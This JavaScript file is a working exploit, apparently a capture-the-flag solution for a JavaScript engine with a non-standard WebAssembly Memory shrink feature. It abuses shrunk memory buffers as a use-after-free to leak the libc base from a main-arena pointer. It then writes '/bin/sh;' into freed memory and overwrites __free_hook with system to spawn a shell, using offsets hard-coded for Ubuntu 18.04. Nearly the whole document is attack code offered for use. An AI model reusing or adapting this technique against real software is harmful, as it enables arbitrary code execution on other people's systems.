// This exploit works only ubuntu 18.04
// TODO: fix code and make it simple
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function ftoi(val) { // typeof(val) = float
		f64_buf[0] = val;
		return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) { // typeof(val) = BigInt
		u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
		u64_buf[1] = Number(BigInt(val) >> 32n);
		return f64_buf[0];
}
function hex(val){
		return "0x"+val.toString(16)
}
function ltob(little_string){
	let addr_string = '0x';
	for(let i=0;i<8;i++){
		addr_string += little_string.slice(16-2*(1+i),16-2*i);
	}
	return addr_string;
}

function btol(big_string){
	let target = big_string;
	let tar_len = target.length;
	for(let i =0;i<16-tar_len;i++){
		target = '0' + target;
	}
	console.log("d  "+target);
	let addr_string = '0x';
	for(let i =0;i<8;i++){
		addr_string += target.slice(16-2*(1+i), 16-2*i);
	}
	return addr_string;
}
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);

let wasmFunction = wasmInstance.exports.main;
var memory = new WebAssembly.Memory({initial:1, maximum:10});
//let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
//console.log("[*] rwx : " + rwx.toString(16));
//rwx = rwx + 1n;
wasmFunction();
memory.shrink(1);
var buf = memory.buffer;
var buf_after = memory.buffer;
view1 = new DataView(buf_after);
view2 = new DataView(buf);
offset = 4113440n;

var little_libc = ftoi(view1.getFloat64(0));
console.log('main arena', ltob(little_libc.toString(16)));
//readline();
var libc = BigInt(ltob(little_libc.toString(16)))- offset;
var one = libc + 0x4f432n;
var system = libc + 0x4f550n;
console.log('[+] libc base : 0x'+libc.toString(16));
var malloc_hook_offset = 4111408n//0x1ebb70n;
var free_hook_offset = 4118760n//0x1eeb28n;

var last  = new WebAssembly.Memory({initial:1, maximum:10});
last.shrink(65536-0x20);
var l_buf = last.buffer;
var l_view = new DataView(l_buf);
var binsh = 0x2f62696e2f73683bn;

l_view.setFloat64(0, itof(binsh));



var memory = new WebAssembly.Memory({initial:1, maximum:10});
memory.shrink(65536-0x60);

//memory.shrink(1);
var tmp_buf = memory.buffer;
view = new DataView(tmp_buf);
memory.shrink(1);
view.setFloat64(0, itof(btol((libc+ free_hook_offset-0x3n).toString(16))));
var memory = new WebAssembly.Memory({initial:1, maximum:10});
//memory.shrink(65535-0x60);
//var wtf = memory.buffer;
//var tmp_b = new ArrayBuffer(0x60);

//var tmp_c = new ArrayBuffer(0x60);
//var t1 = new ArrayBuffer(0x2000-0x10);
//var t2 = new ArrayBuffer(0x2f0-0x10);
var t2 = new WebAssembly.Memory({initial:1, maximum:10});
t2.shrink(65536-0x60);

var memory = new WebAssembly.Memory({initial:1, maximum:10});
memory.shrink(65536-0x60);
var hook = memory.buffer;
var view = new DataView(hook);

view.setFloat64(0x3, itof(btol(system.toString(16))));
last.shrink(1);
